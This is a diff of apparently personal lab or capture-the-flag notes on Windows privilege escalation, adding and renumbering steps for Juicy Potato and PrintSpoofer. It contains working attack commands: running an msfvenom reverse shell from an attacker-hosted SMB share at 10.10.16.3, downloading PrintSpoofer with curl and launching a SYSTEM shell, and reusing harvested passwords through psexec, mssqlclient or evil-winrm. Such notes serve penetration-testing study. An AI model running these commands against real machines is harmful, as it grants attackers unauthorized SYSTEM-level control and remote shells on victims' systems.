@@ -332,13 +332,18 @@ in the meterpreter shell type
 sometimes you need to migrate to another process to get the NT AUTHORITY\SYSTEM
 use godpotato
 check Jeeves box FYR
-1- use juicy potato by transferring the file to the target machine (AV is off). JuicyPotato doesn't work on windows server 2019 and windows 10 build 1809. use PrintSpoofer insted.
+4.1- use juicy potato by transferring the file to the target machine (AV is off). JuicyPotato doesn't work on windows server 2019 and windows 10 build 1809. use PrintSpoofer insted.
 download exe file -> https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 -     juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID of your windows machine} #you can get it from https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
-2- use juicy potato by setting up your SMB server (AV is on)
+4.2- use juicy potato by setting up your SMB server (AV is on)
 put juicypotato.exe & reverse.exe from msfvenom in your SMB server
 -     impacket-smbserver raman `pwd` #set up SMB server
 -     cmd /c "\\10.10.16.3\raman\juicypotato.exe -l 1337 -p \\10.10.16.3\raman\reverse.exe -t * -c {CLSID of your windows machine}"
+4.3- PrintSpoofer
+curl 192.168.10.10/PrintSpoofer64.exe -o Pr.exe
+.\Pr.exe -i -c cmd  OR .\PrintSpoofer32.exe -i -c powershell.exe
+
+if you run PowerUp and got a clear password use impacket to login with the open service. If SQL, use mssqlclient.py; if SMB, use psexec.py; if WinRM or evil-winrm
 
 Alternate Data Stream (hidden files)
 ls -la is equal to dir /R in windows
